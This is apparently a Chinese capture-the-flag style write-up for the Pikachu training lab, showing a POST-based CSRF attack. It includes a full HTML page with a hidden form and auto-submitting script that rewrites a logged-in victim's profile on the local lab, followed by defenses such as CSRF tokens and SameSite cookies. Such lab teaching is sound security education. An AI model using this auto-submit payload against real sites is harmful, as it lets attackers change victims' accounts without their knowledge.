---
title: "Pikachu CSRF - CSRF(post)"
date: 2026-10-29 
categories: [Web安全, 靶场Writeup]
tags: [Pikachu, CSRF, POST型CSRF, 自动提交表单]
---

## 题目: Pikachu CSRF - CSRF(post)

## 题目描述
这是一个用户登录页面。登录后可以修改个人信息。本关将修改信息的请求方式改为了 POST，要求利用 CSRF 漏洞伪造 POST 请求修改受害者信息。

## 解题思路
POST 型 CSRF 无法通过直接构造 URL 在浏览器地址栏触发。攻击者需要自己搭建一个恶意网页，在网页中编写一个隐藏的 `<form>` 表单，将 `method` 设置为 `POST`，`action` 指向目标网站的修改接口。
同时，在页面中加入一段 JavaScript 代码，让页面加载完毕后**自动提交**这个表单。当受害者访问这个恶意页面时，浏览器会自动向靶场发送 POST 请求。

## 解题步骤

**1. 登录并抓包分析**
* 使用正确的账号密码（如 `kobe / 123456`）登录。
* 进入修改个人信息页面，随便改个数据点击提交。开启 Burp Suite 或 F12 抓包。
* 确认此时请求为 `POST` 请求，目标接口为 `csrf_post_edit.php`，参数（如 `sex`、`phonenum`、`add`、`email`）放在请求体中。

**2. 编写恶意 HTML 页面**
* 在本地新建一个文本文件，命名为 `csrf_post.html`。
* 编写包含隐藏表单和自动提交脚本的 HTML 代码，注意 `action` 的路径要与你本地靶场的实际路径一致：
  ```html
  <html>
    <body>
      <form id="csrf-form" action="http://127.0.0.1/pikachu/vul/csrf/csrfpost/csrf_post_edit.php" method="POST">
        <input type="hidden" name="sex" value="hacker">
        <input type="hidden" name="phonenum" value="110">
        <input type="hidden" name="add" value="hacked">
        <input type="hidden" name="email" value="hacker@evil.com">
        <input type="hidden" name="submit" value="submit">
      </form>
      <script>
        document.getElementById("csrf-form").submit();
      </script>
    </body>
  </html>
  ```
3. 触发攻击
保持浏览器中 kobe 账号处于登录状态。
在同一个浏览器的新标签页中，打开刚刚创建的 csrf_post.html 文件（或者通过本地 Web 服务器访问）。
页面会瞬间闪过，JavaScript 自动提交了表单。

4. 验证结果
回到靶场，刷新个人会员中心页面。
看到个人信息已被成功修改为 hacker、110、hacked，说明 POST 型 CSRF 攻击成功。

## 知识点总结
1. **POST 型 CSRF 的利用方式：** 虽然 POST 请求不能直接通过 URL 触发，但利用恶意 HTML 表单加上 JS 自动提交，可以完美模拟用户的合法操作。实战中，攻击者会将这个 HTML 页面托管在公网服务器上，诱导受害者访问。
2. **CSRF Token 的重要性：** 如果 POST 请求中带有一个随机生成的 Token（且攻击者无法预知），那么这种自动提交表单的攻击就会失效。因为服务器会校验 Token，而恶意页面无法获取受害者的 Token。

### 防御策略：
对所有修改数据的接口强制使用 POST 请求（提高攻击门槛）。
必须引入 CSRF Token 校验。
开启 Cookie 的 SameSite 属性，限制跨站请求携带 Cookie
